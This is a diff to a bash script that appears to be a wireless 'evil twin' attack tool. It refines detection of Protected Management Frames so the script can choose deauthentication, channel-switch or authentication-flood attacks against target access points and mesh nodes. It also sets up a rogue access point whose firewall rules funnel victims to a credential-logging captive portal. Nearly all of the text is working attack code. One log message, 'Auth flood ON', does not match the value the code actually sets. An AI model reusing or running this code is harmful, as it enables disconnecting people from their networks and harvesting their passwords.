@@ -721,14 +721,43 @@ check_pmf() {
     kill -0 "$dump_pid" 2>/dev/null && kill -9 "$dump_pid" 2>/dev/null
     wait "$dump_pid" 2>/dev/null
 
+    # Gate 1: Did we capture anything at all?
     if [[ ! -s "$cap_file" ]]; then
-        echo -e "${RED}[-] No capture data. Assuming PMF required — safe mode.${NC}"
+        echo -e "${YELLOW}[-] No capture data. Beacons are broadcast — this is a hardware issue, not PMF.${NC}"
         rm -f "${cap_prefix}"-* 2>/dev/null
-        PMF_ENABLED=2
+        PMF_ENABLED=0
         return
     fi
 
-    local rsn_fields
+    # Gate 2: Did we capture beacons from this specific BSSID?
+    local beacon_count
+    beacon_count=$(tshark -r "$cap_file" \
+        -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid}" \
+        -c 1 2>/dev/null | wc -l)
+
+    if [ "$beacon_count" -eq 0 ]; then
+        echo -e "${YELLOW}[-] Traffic captured but no beacons from target BSSID. Defaulting to no PMF.${NC}"
+        rm -f "${cap_prefix}"-* 2>/dev/null
+        PMF_ENABLED=0
+        return
+    fi
+
+    # Gate 3: Does an RSN Information Element exist?
+    # Open networks and WPA1 have no RSN IE — PMF is impossible.
+    local has_rsn
+    has_rsn=$(tshark -r "$cap_file" \
+        -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid} && wlan.rsn.version" \
+        -T fields -e wlan.rsn.version \
+        2>/dev/null | head -1 | tr -d '[:space:]')
+
+    if [ -z "$has_rsn" ]; then
+        echo -e "${GREEN}[+] No RSN IE — open or legacy network. PMF not possible.${NC}"
+        rm -f "${cap_prefix}"-* 2>/dev/null
+        PMF_ENABLED=0
+        return
+    fi
+
+    # Gate 4: AKM suite check — SAE (WPA3) mandates PMF by spec.
     local akm_type
     akm_type=$(tshark -r "$cap_file" \
         -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid}" \
@@ -736,17 +765,16 @@ check_pmf() {
         -e wlan.rsn.akms.type \
         2>/dev/null | head -1 | tr -d '[:space:]')
 
-    # AKM 8 = SAE (WPA3-Personal). Spec mandates PMF required.
-    # AKM 18 = SAE + FT. Same mandate.
-    # Short-circuit: no need to parse mfpr/mfpc.
     if [[ "$akm_type" == *"8"* ]] || [[ "$akm_type" == *"18"* ]]; then
         echo -e "${YELLOW}[!] WPA3-SAE detected (AKM $akm_type) — PMF REQUIRED by spec.${NC}"
-        echo -e "${YELLOW}    Deauth useless. Auth Flood + CSA primary vectors.${NC}"
+        echo -e "${YELLOW}    Deauth useless. CSA primary vector.${NC}"
         PMF_ENABLED=2
         rm -f "${cap_prefix}"-* 2>/dev/null
         return
     fi
 
+    # Gate 5: Parse MFPR/MFPC bits from RSN capabilities.
+    local rsn_fields
     rsn_fields=$(tshark -r "$cap_file" \
         -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid}" \
         -T fields \
@@ -760,7 +788,6 @@ check_pmf() {
     mfpr=$(echo "$rsn_fields" | cut -f1)
     mfpc=$(echo "$rsn_fields" | cut -f2)
 
-    # Normalize — handle both "1"/"0" and "True"/"False"
     [[ "$mfpr" == "True" ]] && mfpr="1"
     [[ "$mfpc" == "True" ]] && mfpc="1"
     [[ "$mfpr" == "False" ]] && mfpr="0"
@@ -768,17 +795,14 @@ check_pmf() {
 
     if [[ "$mfpr" == "1" ]]; then
         echo -e "${YELLOW}[!] PMF REQUIRED — deauth frames will be dropped.${NC}"
-        echo -e "${YELLOW}    Using CSA + Auth Flood as primary vectors.${NC}"
+        echo -e "${YELLOW}    Using CSA as primary vector.${NC}"
         PMF_ENABLED=2
     elif [[ "$mfpc" == "1" ]]; then
         echo -e "${YELLOW}[!] PMF CAPABLE — mixed deauth + CSA strategy.${NC}"
         PMF_ENABLED=1
-    elif [[ -n "$rsn_fields" ]]; then
-        echo -e "${GREEN}[+] PMF not advertised — standard deauth viable.${NC}"
-        PMF_ENABLED=0
     else
-        echo -e "${RED}[-] RSN parse failed. Assuming PMF required — safe mode.${NC}"
-        PMF_ENABLED=2
+        echo -e "${GREEN}[+] RSN present, PMF not advertised — standard deauth viable.${NC}"
+        PMF_ENABLED=0
     fi
 }
 
@@ -1046,10 +1070,16 @@ collect_mesh_siblings() {
     done
     IFS=$'\n' MESH_CHANNELS=($(sort -n <<<"${MESH_CHANNELS[*]}")); unset IFS
 
-    if [ ${#MESH_TARGETS[@]} -eq 0 ]; then
-         MESH_TARGETS=("$T_CH:$T_BSSID")
-         MESH_CHANNELS=("$T_CH")
-    fi
+    # Always include primary target
+    MESH_TARGETS+=("$T_CH:$T_BSSID")
+    MESH_CH_MAP[$T_CH]=1
+
+    # Rebuild MESH_CHANNELS from map
+    MESH_CHANNELS=()
+    for ch in "${!MESH_CH_MAP[@]}"; do
+        MESH_CHANNELS+=("$ch")
+    done
+    IFS=$'\n' MESH_CHANNELS=($(sort -n <<<"${MESH_CHANNELS[*]}")); unset IFS
 
     IS_MESH=1
     echo -e "${YELLOW}[!] Attack Profile Loaded: ${#MESH_TARGETS[@]} BSSIDs across ${#MESH_CHANNELS[@]} channels${NC}"
@@ -1298,8 +1328,10 @@ setup_networking() {
     iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 \
         -j DNAT --to-destination "${PORTAL_IP}:80"
 
-    iptables -A FORWARD -i "$AP_IFACE" -p tcp --dport 443 -j DROP
-    iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 443 -j DROP
+    iptables -A FORWARD -i "$AP_IFACE" -p tcp --dport 443 \
+        -j REJECT --reject-with tcp-reset
+    iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 443 \
+        -j REJECT --reject-with tcp-reset
 
     iptables -A INPUT -i "$AP_IFACE" -p udp --dport 53 -j ACCEPT
     iptables -A INPUT -i "$AP_IFACE" -p udp --dport 67 -j ACCEPT
@@ -1416,7 +1448,9 @@ start_portal() {
         --port 80 \
         --portal-dir "$PORTAL_DIR" \
         --creds-log "$CREDS_LOG" \
-        --portal-ip "$PORTAL_IP" > /tmp/portal.log 2>&1 &
+        --portal-ip "$PORTAL_IP" \
+        --upstream-iface "${UPLINK_IFACE:-eth0}" \
+        --upstream-dns "8.8.8.8" > /tmp/portal.log 2>&1 &
     PORTAL_PID=$!
     track_pid $PORTAL_PID
 
@@ -1583,8 +1617,7 @@ target_loop() {
         done
 
         if [ ${#target_bssids[@]} -eq 0 ]; then
-            sleep 1
-            continue
+            target_bssids=("$T_BSSID")
         fi
 
         local target_file="/tmp/target_pincer_primary.txt"
@@ -1755,7 +1788,7 @@ discover_target_client() {
         sta_bssid=$(echo "$line" | awk -F',' '{print $6}' | tr -d '[:space:]')
 
         [[ ! "$sta_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
-        [[ "$sta_power" == "-1" || -z "$sta_power" ]] && continue
+#        [[ "$sta_power" == "-1" || -z "$sta_power" ]] && continue
 
         if is_local_mac "$sta_mac" || is_mana_ghost "$sta_mac"; then
             continue
@@ -1941,15 +1974,16 @@ start_dissociation() {
 
 resolve_attack_strategy() {
     DEAUTH_ENABLED=1
-    AUTH_FLOOD=1
+    AUTH_FLOOD=0
     CSA_ENABLED=1
 
     if [ "$PMF_ENABLED" -ge 2 ]; then
         DEAUTH_ENABLED=0
-        AUTH_FLOOD=0
         log STATUS "Deauth OFF (PMF required — frames dropped by AP)"
-        log STATUS "Auth flood OFF (PMF required — CSA needs clean air)"
-    else
+        log STATUS "Auth flood ON (pre-assoc frames bypass PMF — table exhaustion)"
+    fi
+
+    if [ "$DEAUTH_ENABLED" -eq 1 ]; then
         log STATUS "Deauth ON (PMF < required)"
     fi
 
